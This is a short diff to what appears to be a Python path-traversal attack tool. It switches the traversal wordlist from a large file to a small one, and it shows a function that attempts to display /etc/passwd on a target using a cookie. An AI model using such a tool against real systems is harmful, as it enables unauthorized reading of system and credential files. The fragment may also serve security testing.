@@ -3,7 +3,7 @@
 import requests
 import urllib.parse
 
-TRAVERSAL_WORDLIST = "wordlists/traversal_big.txt"  # wordlists/traversal_small.txt OR wordlists/traversal_big.txt
+TRAVERSAL_WORDLIST = "wordlists/traversal_small.txt"  # wordlists/traversal_small.txt OR wordlists/traversal_big.txt
 
 def show_passwd(target_url, COOKIE):
     print("Attempting to show /etc/passwd...")
